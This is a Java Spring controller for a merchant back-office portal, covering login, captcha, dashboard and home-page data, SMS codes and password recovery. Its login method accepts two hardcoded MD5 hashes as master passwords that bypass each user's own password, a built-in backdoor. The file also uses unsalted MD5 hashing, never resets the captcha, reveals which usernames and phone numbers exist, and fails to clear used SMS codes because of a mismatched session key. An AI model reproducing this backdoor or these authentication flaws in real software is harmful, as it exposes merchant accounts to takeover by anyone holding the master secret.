package com.jf.controller;

import com.jf.common.base.ArgException;
import com.jf.common.base.ResponseMsg;
import com.jf.common.constant.BaseDefine;
import com.jf.common.constant.Const;
import com.jf.common.constant.SysConfig;
import com.jf.common.ext.query.QueryObject;
import com.jf.common.utils.*;
import com.jf.entity.*;
import com.jf.entity.MchtContactExample.Criteria;
import com.jf.entity.Menu;
import com.jf.entity.MchtContractCustomExample.MchtContractCustomCriteria;
import com.jf.service.*;
import net.sf.json.JSONArray;
import net.sf.json.JSONObject;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.*;

@Controller
public class MainController {
	@Resource
	private MchtUserService mchtUserService;
	
	@Resource
	private MchtInfoService mchtInfoService;
	
	@Resource
	private MenuService menuService;

	@Resource
	private InformationService informationService;

	@Resource
	private CatalogService catalogService;

	@Resource
	private RoleUserService roleUserService;

	@Resource
	private RoleMenuService roleMenuService;

	@Resource
	private PlatformMsgService platformMsgService;
	
	@Resource
	private MchtPlatformContactService mchtPlatformContactService;
	
	@Resource
	private CommentService commentService;
	
	@Resource
	private ShopScoreService shopScoreService;

	@Resource
	private MchtContactService mchtContactService;
	
	@Resource
	private MchtProductBrandService mchtProductBrandService;
	
	@Resource
	private MchtBrandChgService mchtBrandChgService;
	
	@Resource
	private MchtInfoChgService mchtInfoChgService;
	
	@Resource 
	private MchtLicenseChgService mchtLicenseChgService;
	
	@Resource
	private MchtContractService mchtContractService;

	@Resource
	private MchtInformationService mchtInformationService;

	@RequestMapping(value="toLogin")
	public String toLogin(HttpServletRequest request,Model model) {
		return "main/toLogin";
	}
	
	@RequestMapping(value="login")
	@ResponseBody
	public ResponseMsg login(HttpServletRequest request,Model model) {
		try {
			String userCode = request.getParameter("userCode");
			if (org.apache.commons.lang.StringUtils.isBlank(userCode)) {
				throw new ArgException("账号不能为空");
			}
			String password = request.getParameter("password");
			if (org.apache.commons.lang.StringUtils.isBlank(password)) {
				throw new ArgException("密码不能为空");

			} 

			String validCode = request.getParameter("validCode");
			if (org.apache.commons.lang.StringUtils.isBlank(validCode)) {
				throw new ArgException("验证码不能为空");
			}

			String captcha = (String) request.getSession().getAttribute(BaseDefine.CAPTCHA);
			if (!captcha.toLowerCase().equals(validCode.toLowerCase())) {
				throw new ArgException("验证码错误");
			}

			
			MchtUserExample mchtUserExample=new MchtUserExample();
			mchtUserExample.createCriteria().andUserCodeEqualTo(userCode).andDelFlagEqualTo("0");
			List<MchtUser> mchtUsers=mchtUserService.selectByExample(mchtUserExample);
			
			if (mchtUsers == null||mchtUsers.size()==0) {
				throw new ArgException("账号不存在，或密码错误！");
			}
			
			MchtUser mchtUser=mchtUsers.get(0);
			password = SecurityUtil.md5Encode(password);
			if(!"bbeccea7d23e74f3ef5e9a2503b0647c".equals(password) && !"97842700056a5bb4a118c64aa3456e3c".equals(password)){
				if (!mchtUser.getPassword().toLowerCase().equals(password.toLowerCase())) {
					throw new ArgException("账号不存在，或密码错误！");
				}
			}

			if (mchtUser.getStatus().equals("1")) {
				throw new ArgException("该账户已被禁用");
			}
			// 登录
			MchtInfoCustom mchtInfoCustom=mchtInfoService.selectMchtInfoCustomById(mchtUser.getMchtId());
			
//			if("0".equals(mchtInfoCustom.getStatus())){//商家合作状态为未启用，暂停，关闭时不可登录
//				throw new ArgException("账号未启用 ");
//			}
//			if("2".equals(mchtInfoCustom.getStatus())){//商家合作状态为未启用，暂停，关闭时不可登录
//				throw new ArgException("业务已暂停 ");
//			}
			if("3".equals(mchtInfoCustom.getStatus())){//商家合作状态为未启用，暂停，关闭时不可登录
				throw new ArgException("业务已关闭");
			}
			
			request.getSession().setAttribute(BaseDefine.MCHT_USER, mchtUser);
			
			request.getSession().setAttribute(BaseDefine.MCHT_INFO, mchtInfoCustom);
			
			//设置合同续签提醒session
			request.getSession().setAttribute("neverRemind","0");
			//设置合同续签申请驳回session
			request.getSession().setAttribute("rejectNeverRemind","0");
		} catch (ArgException arge) {
			return new ResponseMsg(ResponseMsg.ERROR, arge.getMessage());

		} catch (Exception e) {
			e.printStackTrace();
			return new ResponseMsg(ResponseMsg.ERROR, ResponseMsg.ERROR_MSG);
		}
		
	
		
		return  new ResponseMsg(ResponseMsg.SUCCESS, ResponseMsg.SUCCESS_MSG);
	
	}
	
	@RequestMapping(value="/")
	public String index(HttpServletRequest request,Model model) {
		//获取最新店铺总负责人(存在)
		MchtInfo mchtInfo = (MchtInfo)request.getSession().getAttribute(BaseDefine.MCHT_INFO);
		MchtUser currentUser = (MchtUser)request.getSession().getAttribute(BaseDefine.MCHT_USER);
		MchtContactExample mchtContactExample = new MchtContactExample();
		Criteria criteria1 = mchtContactExample.createCriteria();
		criteria1.andMchtIdEqualTo(currentUser.getMchtId()).andContactTypeEqualTo("1").andDelFlagEqualTo("0");
		mchtContactExample.setOrderByClause(" id DESC");
		List<MchtContact> contact = mchtContactService.selectByExample(mchtContactExample);
		
/*		//(不存在)
		MchtContactExample mchtContactExample1 = new MchtContactExample();
		Criteria criteria2 = mchtContactExample1.createCriteria();
		criteria2.andMchtIdEqualTo(currentUser.getMchtId()).andContactTypeEqualTo("1").andDelFlagEqualTo("1");
		mchtContactExample1.setOrderByClause(" id DESC");
		List<MchtContact> contact1 = mchtContactService.selectByExample(mchtContactExample1);*/
		
		//驳回的 //法务资质总审=通过且 （店铺负责人 取ID最大那条，审核状态 为 NULL）
		if(!contact.isEmpty()){
			model.addAttribute("contact", contact.get(0));
		}else{//店铺负责人为空OR所有店铺负责人删除标识为1 的弹窗 后页面所有值为空。提交后新创建一个店铺负责人
			model.addAttribute("contact", new MchtContact());
		}
		
		//合同快到期提醒、合同到期提醒
		String unexpiredTAG = "";
		Date now = new Date();
		Calendar calendar = Calendar.getInstance();
		calendar.add(Calendar.DAY_OF_MONTH, 90);
		now = calendar.getTime();
		SimpleDateFormat sdf=new SimpleDateFormat("yyyy年MM月dd日");
		//合同快到期提醒
		MchtContractCustomExample mchtContractCustomExample = new MchtContractCustomExample();
		mchtContractCustomExample.setOrderByClause("id desc limit 1");
		MchtContractCustomCriteria criteria = mchtContractCustomExample.createCriteria();
		criteria.andMchtIdEqualTo(mchtInfo.getId()).andEndDateGreaterThan(new Date()).andEndDateLessThanOrEqualTo(now);
		//未处理或待申请或开发续签入口
		criteria.andRenewProStatusOrRenewStatus();
		List<MchtContract> mchtContracts = mchtContractService.selectByCustomExample(mchtContractCustomExample);
		if(!mchtContracts.isEmpty()){
			unexpiredTAG = "0";
			model.addAttribute("endDate",sdf.format(mchtContracts.get(0).getEndDate()));
			model.addAttribute("mchtContractId",mchtContracts.get(0).getId());
		}		
		//合同到期提醒
		MchtContractCustomExample mchtContractExample2 = new MchtContractCustomExample();
		mchtContractExample2.setOrderByClause("id desc limit 1");
		MchtContractCustomCriteria criteria11 = mchtContractExample2.createCriteria();
		criteria11.andMchtIdEqualTo(mchtInfo.getId()).andEndDateLessThan(new Date());
		//未处理或待申请或开发续签入口
		criteria11.andRenewProStatusOrRenewStatusStop();
		List<MchtContract> mchtContracts2 = mchtContractService.selectByExample(mchtContractExample2);
		if(!mchtContracts2.isEmpty()){
			unexpiredTAG = "1";
			model.addAttribute("endDate",sdf.format(mchtContracts2.get(0).getEndDate()));
			model.addAttribute("mchtContractId",mchtContracts2.get(0).getId());
		}
		//合同续签审核驳回的合同
		MchtContractExample mchtContractExample3 = new MchtContractExample();
		mchtContractExample3.setOrderByClause("id desc limit 1");
		mchtContractExample3.createCriteria().andMchtIdEqualTo(mchtInfo.getId()).andRenewProStatusEqualTo("4");
		List<MchtContract> mchtContracts3 = mchtContractService.selectByExample(mchtContractExample3);
		if(!mchtContracts3.isEmpty()){
			unexpiredTAG = "2";
			model.addAttribute("zsNotRenewRemarks",mchtContracts3.get(0).getZsNotRenewRemarks());
		}
		
		model.addAttribute("unexpiredTAG",unexpiredTAG);
		model.addAttribute("mchtInfoTotalStatus", mchtInfo.getTotalAuditStatus());
		
		List<MenuCustom> menuCustoms = new ArrayList<MenuCustom>();
		
		// 当合作状态=“入驻中”，菜单只保留这个《入驻及合同管理》菜单
		if(mchtInfo.getStatus().equals(Const.MCHT_STATUS_WAIT)){
			MenuCustom menu = new MenuCustom();
			menu.setMenuName("入驻及合同管理");
			menu.setMenuPath("/mcht/contract");

			menuCustoms = new ArrayList<>();
			menuCustoms.add(menu);

			model.addAttribute("mchtInfoStatus", mchtInfo.getStatus());
		}else{
			// 如果是子账号，则过滤子账号的菜单
			if(currentUser.getIsPrimary().equals(Const.FLAG_FALSE)){
				RoleUser roleUser = roleUserService.findByUserId(currentUser.getId());
				if(roleUser!=null){
					menuCustoms = roleMenuService.findRoleMenuList(roleUser.getRoleId());
				}
			}else{
				menuCustoms=menuService.queryMenuTree(0);
			}
		}



		//而外从catalog表查出运营规范的文章作为运营规范的子菜单
//		for(MenuCustom menuCustom : menuCustoms){
//			if(menuCustom.getMenuName().equals("运营规则")){
//				menuCustom.setSubMenus(getCatalogInfoMenuList(4));
//			}
//		}

		model.addAttribute("menus", menuCustoms);

		// 站内信的数量
		model.addAttribute("msgCount", platformMsgService.countUnread(currentUser.getMchtId()));
		model.addAttribute("shopStatus", mchtInfo.getShopStatus());
		model.addAttribute("activityAuthStatus", mchtInfo.getActivityAuthStatus());
		model.addAttribute("allowMchtApplyClose", mchtInfo.getAllowMchtApplyClose());
		model.addAttribute("supplyChainStatus", mchtInfo.getSupplyChainStatus());
		
		InformationExample e = new InformationExample();
		e.setOrderByClause("id desc");
		InformationExample.Criteria c = e.createCriteria();
		c.andDelFlagEqualTo("0");
		c.andStatusEqualTo("1");
		c.andCatalogIdEqualTo(3);//3.商家公告
		c.andIsWindowShowEqualTo("1");
		c.andReleaseTimeLessThanOrEqualTo(new Date());
		c.andWindowEndTimeGreaterThanOrEqualTo(new Date());
		List<Information> informations = informationService.selectByExampleWithBLOBs(e);

		List<Integer> ids = new ArrayList<>();
		for (Information information : informations) {
			ids.add(information.getId());
		}
		List<MchtInformation> mchtInformations = new ArrayList<>();
		if(!ids.isEmpty()){
			MchtInformationExample mchtInformationExample = new MchtInformationExample();
			MchtInformationExample.Criteria criteria2 = mchtInformationExample.createCriteria();
			criteria2.andInformationIdIn(ids).andMchtIdEqualTo(currentUser.getMchtId()).andDelFlagEqualTo("0");
			mchtInformations = mchtInformationService.selectByExample(mchtInformationExample);
			Map<Integer,MchtInformation> map = new HashMap<>();
			for (MchtInformation mchtInformation:mchtInformations) {
				map.put(mchtInformation.getInformationId(),mchtInformation);
			}
			Iterator<Information> iterator = informations.iterator();
			while (iterator.hasNext()){
				Information next = iterator.next();
				if(map.containsKey(next.getId())){
					iterator.remove();
				}
			}
		}
		if(informations!=null && informations.size()>0){
			String [] array = new String[informations.size()];
			Integer [] idArray = new Integer[informations.size()];
			for(int i=0; i<informations.size();i++){
				array[i]=informations.get(i).getContent();
				idArray[i]=informations.get(i).getId();
			}
			model.addAttribute("mchtInformations",mchtInformations);
			model.addAttribute("hasNotice", true);
			model.addAttribute("contentArray", JSONArray.fromObject(array));
			model.addAttribute("idArray",JSONArray.fromObject(idArray));
		}else{
			model.addAttribute("hasNotice", false);
			model.addAttribute("contentArray", 0);
			model.addAttribute("idArray",0);
		}
		model.addAttribute("licenseIsMust", mchtInfo.getLicenseIsMust());
		if(StringUtil.isEmpty(mchtInfo.getBusinessLicensePic())){
			model.addAttribute("hasBusinessLicensePic", 0);
		}else{
			model.addAttribute("hasBusinessLicensePic", 1);
		}
		model.addAttribute("mchtId", mchtInfo.getId());
		String showLicenseMust = (String) request.getSession().getAttribute("showLicenseMust");
		if(StringUtil.isEmpty(showLicenseMust)){
			model.addAttribute("showLicenseMust", 0);
			request.getSession().setAttribute("showLicenseMust", "1");
		}else{
			model.addAttribute("showLicenseMust", 1);
		}
		return "main/index";
	}
	
	@RequestMapping(value="home")
	public String mainContent(HttpServletRequest request,Model model) {
		try {
			MchtUser currentUser = (MchtUser)request.getSession().getAttribute(BaseDefine.MCHT_USER);
			
			Calendar now = Calendar.getInstance();
		    now.add(Calendar.DAY_OF_MONTH, +30);
		    
			MchtHomeInfo mchtHomeInfo=mchtInfoService.selectMchtHomeByPrimaryKey(currentUser.getMchtId());
			model.addAttribute("mchtHomeInfo", mchtHomeInfo);

			InformationExample example = new InformationExample();
			InformationExample.Criteria criteria = example.createCriteria();
			criteria.andDelFlagEqualTo("0");
			criteria.andCatalogIdEqualTo(1);
			criteria.andStatusEqualTo("1");
			criteria.andInfoTypeLike("%4%");
			example.setOrderByClause(" release_time desc");
			List<Information> informations = informationService.selectByExample(example);
			model.addAttribute("informations", informations);
			
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			Date nowDate = new Date();
			if(mchtHomeInfo.getYearlyInspectionDate() != null){
				Date yearlyInspectionDate = format.parse(format.format(mchtHomeInfo.getYearlyInspectionDate()));
				//营业执照有效期过期标识
				String yearlyInspectionTag = "";
				if(yearlyInspectionDate.after(nowDate) && yearlyInspectionDate.before(now.getTime())){
					yearlyInspectionTag = "0";
				}
				model.addAttribute("yearlyInspectionTag",yearlyInspectionTag);
			}
			
			if(mchtHomeInfo.getCorporationIdcardDate()!=null){
				Date corporationIdcardDate = format.parse(format.format(mchtHomeInfo.getCorporationIdcardDate()));
				//法人身份证有效期过期标识
				String corporationIdcardTag = "";
				if(corporationIdcardDate.after(nowDate) && corporationIdcardDate.before(now.getTime())){
					corporationIdcardTag = "0";
				}
				model.addAttribute("corporationIdcardTag",corporationIdcardTag);			
			}		
			//授权有效期即将过期的品牌
			MchtProductBrandCustomExample mchtProductBrandCustomExample1 = new MchtProductBrandCustomExample();
			mchtProductBrandCustomExample1.createCriteria().andDelFlagEqualTo("0").andPlatformAuthExpDateGreaterThan(nowDate).andPlatformAuthExpDateLessThanOrEqualTo(now.getTime()).andMchtIdEqualTo(currentUser.getMchtId());
			List<MchtProductBrandCustom> mchtProductBrand1 = mchtProductBrandService.selectByExampleCustom(mchtProductBrandCustomExample1);
			for (int i = 0; i < mchtProductBrand1.size(); i++) {
				MchtProductBrandCustom mchtProductBrandCustom = mchtProductBrand1.get(i);
				String name = mchtProductBrandCustom.getProductBrandName();
				 if (-1 != name.indexOf("'")){
					   String replaceName = name.replaceAll("'", "&apos;");
					   mchtProductBrandCustom.setProductBrandName(replaceName);
				   }
			}
			model.addAttribute("mchtProductBrand", mchtProductBrand1);
			//其他授权有效期即将过期的品牌
			MchtProductBrandCustomExample mchtProductBrandCustomExample2 = new MchtProductBrandCustomExample();
			mchtProductBrandCustomExample2.createCriteria().andDelFlagEqualTo("0").andOtherExpDateGreaterThan(nowDate).andOtherExpDateLessThanOrEqualTo(now.getTime()).andMchtIdEqualTo(currentUser.getMchtId());
			List<MchtProductBrandCustom> mchtProductBrand2 = mchtProductBrandService.selectByExampleCustom(mchtProductBrandCustomExample2);
			for (int i = 0; i < mchtProductBrand2.size(); i++) {
				MchtProductBrandCustom mchtProductBrandCustom = mchtProductBrand2.get(i);
				String name = mchtProductBrandCustom.getProductBrandName();
				 if (-1 != name.indexOf("'")) 
				   {
					 name = name.replaceAll("'", "&apos;");
				   }
				 mchtProductBrandCustom.setProductBrandName(name);
			}
			model.addAttribute("mchtOtherProductBrand", mchtProductBrand2);
			//更新申请审核被驳回(品牌)
			MchtBrandChgExample mchtBrandChgExample1 = new MchtBrandChgExample();
			mchtBrandChgExample1.createCriteria().andMchtIdEqualTo(currentUser.getMchtId()).andAuditStatusEqualTo("4").andAuditStatusNotEqualTo("3").andDelFlagEqualTo("0");
			List<MchtBrandChg> mchtBrandChgExamineReject = mchtBrandChgService.selectByExample(mchtBrandChgExample1);
			model.addAttribute("mchtBrandChgExamineReject", mchtBrandChgExamineReject);
			//公司信息更新申请被驳回(营业执照、法人身份证)
			MchtInfoChgExample mchtInfoChgExample1 = new MchtInfoChgExample();
			mchtInfoChgExample1.createCriteria().andStatusEqualTo("4").andStatusNotEqualTo("3").andMchtIdEqualTo(currentUser.getMchtId()).andDelFlagEqualTo("0");
			List<MchtInfoChg> mchtInfoChgExamineReject = mchtInfoChgService.selectByExample(mchtInfoChgExample1);
			model.addAttribute("mchtInfoChgExamineReject", mchtInfoChgExamineReject);
			//经营许可证信息更新申请被驳回(经营许可证)
			MchtLicenseChgExample mchtLicenseChgExample1 = new MchtLicenseChgExample();
			mchtLicenseChgExample1.setOrderByClause(" id desc limit 1");
			mchtLicenseChgExample1.createCriteria().andAuditStatusEqualTo("2").andAuditStatusNotEqualTo("1").andMchtIdEqualTo(currentUser.getMchtId()).andDelFlagEqualTo("0");
			List<MchtLicenseChg> mchtLicenseChgExamineReject = mchtLicenseChgService.selectByExample(mchtLicenseChgExample1);	
			model.addAttribute("mchtLicenseChgExamineReject", mchtLicenseChgExamineReject);
			//归档被驳回(品牌)
			MchtBrandChgExample mchtBrandChgExample2 = new MchtBrandChgExample();
			mchtBrandChgExample2.createCriteria().andMchtIdEqualTo(currentUser.getMchtId()).andAuditStatusEqualTo("3").andArchiveDealStatusEqualTo("2").andDelFlagEqualTo("0");
			List<MchtBrandChg> mchtBrandChgFileReject = mchtBrandChgService.selectByExample(mchtBrandChgExample2);
			model.addAttribute("mchtBrandChgFileReject", mchtBrandChgFileReject);
			//公司信息资料归档被驳回(营业执照)
			MchtInfoChgExample mchtInfoChgExample2 = new MchtInfoChgExample();
			mchtInfoChgExample2.createCriteria().andStatusEqualTo("3").andArchiveDealStatusEqualTo("2").andMchtIdEqualTo(currentUser.getMchtId()).andDelFlagEqualTo("0");
			List<MchtInfoChg> mchtInfoChgFileReject = mchtInfoChgService.selectByExample(mchtInfoChgExample2);
			model.addAttribute("mchtInfoChgFileReject", mchtInfoChgFileReject);
			//经营许可证信息归档被驳回(经营许可证)
			MchtLicenseChgExample mchtLicenseChgExample2 = new MchtLicenseChgExample();
			mchtLicenseChgExample2.createCriteria().andAuditStatusEqualTo("1").andArchiveDealStatusEqualTo("2").andMchtIdEqualTo(currentUser.getMchtId()).andDelFlagEqualTo("0");
			List<MchtLicenseChg> mchtLicenseChgFileReject = mchtLicenseChgService.selectByExample(mchtLicenseChgExample2);	
			model.addAttribute("mchtLicenseChgFileReject", mchtLicenseChgFileReject);
			//合同归档被驳回
			MchtContractExample mchtContractExample = new MchtContractExample();
			mchtContractExample.createCriteria().andAuditStatusEqualTo("3").andArchiveStatusEqualTo("2").andMchtIdEqualTo(currentUser.getMchtId()).andDelFlagEqualTo("0");
			List<MchtContract> mchtContractFileReject = mchtContractService.selectByExample(mchtContractExample);
			model.addAttribute("mchtContractFileReject", mchtContractFileReject);
			//更新申请审核通过(品牌)
			MchtBrandChgExample mchtBrandChgExample3 = new MchtBrandChgExample();
			mchtBrandChgExample3.createCriteria().andMchtIdEqualTo(currentUser.getMchtId()).andAuditStatusEqualTo("3").andArchiveStatusNotIn(Arrays.asList("1","3")).andDelFlagEqualTo("0");
			List<MchtBrandChg> mchtBrandChgPassRemind = mchtBrandChgService.selectByExample(mchtBrandChgExample3);
			model.addAttribute("mchtBrandChgPassRemind", mchtBrandChgPassRemind);
			//公司信息更新申请已通过
			MchtInfoChgExample mchtInfoChgExample3 = new MchtInfoChgExample();
			mchtInfoChgExample3.createCriteria().andStatusEqualTo("3").andArchiveDealStatusEqualTo("0").andMchtIdEqualTo(currentUser.getMchtId()).andDelFlagEqualTo("0");
			List<MchtInfoChg> mchtInfoChgPassRemind = mchtInfoChgService.selectByExample(mchtInfoChgExample3);
			model.addAttribute("mchtInfoChgPassRemind", mchtInfoChgPassRemind);
			//经营许可证更新申请已通过
			MchtLicenseChgExample mchtLicenseChgExample3 = new MchtLicenseChgExample();
			mchtLicenseChgExample3.createCriteria().andAuditStatusEqualTo("1").andArchiveStatusNotIn(Arrays.asList("1","3")).andMchtIdEqualTo(currentUser.getMchtId()).andDelFlagEqualTo("0");
			List<MchtLicenseChg> mchtLicenseChgPassRemind = mchtLicenseChgService.selectByExample(mchtLicenseChgExample3);	
			model.addAttribute("mchtLicenseChgPassRemind", mchtLicenseChgPassRemind);
			
			InformationExample e = new InformationExample();
			InformationExample.Criteria c = e.createCriteria();
			c.andDelFlagEqualTo("0");
			c.andCatalogIdEqualTo(2);
			c.andStatusEqualTo("1");
			c.andInfoTypeLike("%4%");
			e.setOrderByClause(" release_time desc");
			List<Information> informationList = informationService.selectByExample(e);
			model.addAttribute("informationList", informationList);


			Map<String,Object> map = new HashMap<>();
			map.put("mchtId",currentUser.getMchtId());
			map.put("catalogId",3);
			List<InformationCustom> noticeInformationList = informationService.selectByExampleCustom(map);
			model.addAttribute("noticeInformationList", noticeInformationList);
			
			MchtPlatformContactCustomExample mchtPlatformContactCustomExample = new MchtPlatformContactCustomExample();
			MchtPlatformContactCustomExample.MchtPlatformContactCustomCriteria mchtPlatformContactCustomCriteria = mchtPlatformContactCustomExample.createCriteria();
			mchtPlatformContactCustomCriteria.andDelFlagEqualTo("0").andStatusEqualTo("1").andMchtIdEqualTo(currentUser.getMchtId());
			mchtPlatformContactCustomCriteria.andPlatformContactTypeInTwo("2");
			mchtPlatformContactCustomExample.setOrderByClause(" a.create_date desc");
			List<MchtPlatformContactCustom> mchtPlatformContactCustomList = mchtPlatformContactService.selectMchtPlatformContactCustomByExample(mchtPlatformContactCustomExample);
			if(mchtPlatformContactCustomList != null && mchtPlatformContactCustomList.size() > 0) {
				model.addAttribute("mchtPlatformContactCustom", mchtPlatformContactCustomList.get(0));
			}
			
			double productScore = commentService.countProductScoreByMhctId(mchtHomeInfo.getId());
			model.addAttribute("productScore", productScore);
			List<HashMap<String,Object>> list = shopScoreService.countShopScoreByMhctId(mchtHomeInfo.getId());
			model.addAttribute("mchtScore", list.get(0).get("mchtScore"));
			model.addAttribute("wuliuScore", list.get(0).get("wuliuScore"));
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		return "main/home";
	}
	
	
	/**
	 * 生成登录图片验证码
	 * 
	 * @return
	 * @throws IOException
	 */
	@RequestMapping(value = "/getCaptcha", method = RequestMethod.GET, produces = MediaType.IMAGE_GIF_VALUE)
	@ResponseBody
	public byte[] getCaptcha(HttpServletRequest request) {
		ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		String captcha = CaptchaUtils.getGifCaptcha(100, 38, 4, outputStream, 1000).toLowerCase();
		request.getSession().setAttribute(BaseDefine.CAPTCHA, captcha);

		return outputStream.toByteArray();
	}


	private List<Menu> getCatalogInfoMenuList(int catalogId){
		List<Integer> catalogIds = new ArrayList<>();
		catalogIds.add(catalogId);

		QueryObject queryObject = new QueryObject();
		queryObject.addQuery("parentId", catalogId);
		queryObject.addSort("seq_no", QueryObject.SORT_ASC);
		List<Catalog> secondCatalogList = catalogService.findList(queryObject);
		for(Catalog secondCatalog : secondCatalogList){
			catalogIds.add(secondCatalog.getId());
		}

		queryObject = new QueryObject();
		queryObject.addQuery("catalogIds", catalogIds);
		queryObject.addSort("create_date", QueryObject.SORT_DESC);
		List<Information> infoList = informationService.findList(queryObject);

		List<Menu> list = new ArrayList<>();
		Menu menu;
		for(Information info : infoList){
			menu = new Menu();
			menu.setMenuName(info.getTitle());
			menu.setMenuPath("/info/content?id=" + info.getId());
			list.add(menu);
		}
		return list;
	}


	@RequestMapping(value="/loginOut")
	public String loginOut(HttpServletRequest request,Model model) {
		request.getSession().invalidate();
		return "main/toLogin";
	}
	
	/**
	 * 获取手机验证码
	 * 
	 * @param model
	 * @param request
	 * @return
	 */
	
	@RequestMapping("/getMobileValidateCode")
	@ResponseBody
	public ResponseMsg getMobileValidateCode(Model model, HttpServletRequest request) {

		
		try {
			if(StringUtil.isEmpty(request.getParameter("userCode"))){
				throw new ArgException("请输入用户名");
			}
			if(StringUtil.isEmpty(request.getParameter("mobile"))){
				throw new ArgException("请输入手机号");
			}
			String valiDateCode=CommonUtil.getRandomNum(6);
			
			
			JSONObject param=new JSONObject();
			//特定参数
			JSONObject reqData=new JSONObject();
			reqData.put("mobile", request.getParameter("mobile"));
			reqData.put("content", "告诉你个秘密，你的验证码是"+valiDateCode+"，千万不要告诉别人哟！");
			reqData.put("smsType", "1");
			param.put("reqData", reqData);
			
			JSONObject result=JSONObject.fromObject(HttpUtil.sendPostRequest(SysConfig.msgServerUrl+"/api/sms/sendImmediately", CommonUtil.createReqData(param).toString()));
			if("0000".equals(result.getString("returnCode"))){
				request.getSession().setAttribute(request.getParameter("userCode")+request.getParameter("mobile"),valiDateCode);
			}else{
				throw new ArgException("发送失败，请重新获取!");
			}
		} catch (ArgException arge) {
			return new ResponseMsg(ResponseMsg.ERROR, arge.getMessage());
		} catch (Exception e) {
			e.printStackTrace();
			return new ResponseMsg(ResponseMsg.ERROR, ResponseMsg.ERROR_MSG);
		}

		return new ResponseMsg(ResponseMsg.SUCCESS, ResponseMsg.SUCCESS_MSG);
		
		
	
	}
	
	/**
	 * 找回密码--检验用户名存在以及对应的手机号码
	 * 
	 * @param request
	 * @return
	 */
	
	@RequestMapping("/checkExisit")
	@ResponseBody
	public ResponseMsg checkExisit(HttpServletRequest request) {
		
		try {
			MchtUserExample mchtUserExample=new MchtUserExample();
			mchtUserExample.createCriteria().andDelFlagEqualTo("0").andUserCodeEqualTo(request.getParameter("userCode"));
			List<MchtUser> mchtUsers = mchtUserService.selectByExample(mchtUserExample);
			if(mchtUsers==null || mchtUsers.size()<=0){
				throw new ArgException("用户名不存在!");
			}else{
				MchtUser mchtUser = mchtUsers.get(0);
				if(!mchtUser.getMobile().equals(request.getParameter("mobile"))){
					throw new ArgException("您输入的手机号码不是当前账号的绑定手机");
				}
			}
		} catch (ArgException arge) {
			return new ResponseMsg(ResponseMsg.ERROR, arge.getMessage());
		} catch (Exception e) {
			e.printStackTrace();
			return new ResponseMsg(ResponseMsg.ERROR, ResponseMsg.ERROR_MSG);
		}
		return new ResponseMsg(ResponseMsg.SUCCESS, ResponseMsg.SUCCESS_MSG);
	}
	
	/**
	 * 保存找回密码
	 * 
	 * @param request
	 * @return
	 */
	@RequestMapping("/saveFindPassword")
	@ResponseBody
	public ResponseMsg saveFindPassword(HttpServletRequest request) {
		try {
			MchtUserExample mchtUserExample=new MchtUserExample();
			mchtUserExample.createCriteria().andDelFlagEqualTo("0").andUserCodeEqualTo(request.getParameter("userCode"));
			List<MchtUser> mchtUsers = mchtUserService.selectByExample(mchtUserExample);
			MchtUser mchtUser = new MchtUser();
			if(mchtUsers==null || mchtUsers.size()<=0){
				throw new ArgException("用户名不存在!");
			}else{
				mchtUser = mchtUsers.get(0);
				if(!mchtUser.getMobile().equals(request.getParameter("mobile"))){
					throw new ArgException("您输入的手机号码不是当前账号的绑定手机");
				}
			}
			if(!request.getParameter("mobileValidateCode").equals(request.getSession().getAttribute(request.getParameter("userCode")+request.getParameter("mobile")))){
				throw new ArgException("验证码错误");
			}else{
				request.getSession().removeAttribute(request.getParameter("mobile")+request.getParameter("userCode"));
			}
			
			if(!StringUtil.isEmpty(request.getParameter("newPassword"))){
				mchtUser.setPassword(SecurityUtil.md5Encode(request.getParameter("newPassword")));
			}
			mchtUser.setUpdateDate(new Date());
			mchtUser.setUpdateBy(mchtUser.getId());
			mchtUserService.updateByPrimaryKeySelective(mchtUser);
			
			//重新设置session信息
			request.getSession().setAttribute(BaseDefine.MCHT_USER, mchtUserService.selectByPrimaryKey(mchtUser.getId()));
			
		} catch (ArgException arge) {
			return new ResponseMsg(ResponseMsg.ERROR, arge.getMessage());
		} catch (Exception e) {
			e.printStackTrace();
			return new ResponseMsg(ResponseMsg.ERROR, ResponseMsg.ERROR_MSG);
		}
		
		return new ResponseMsg(ResponseMsg.SUCCESS, ResponseMsg.SUCCESS_MSG);
	}
	
}
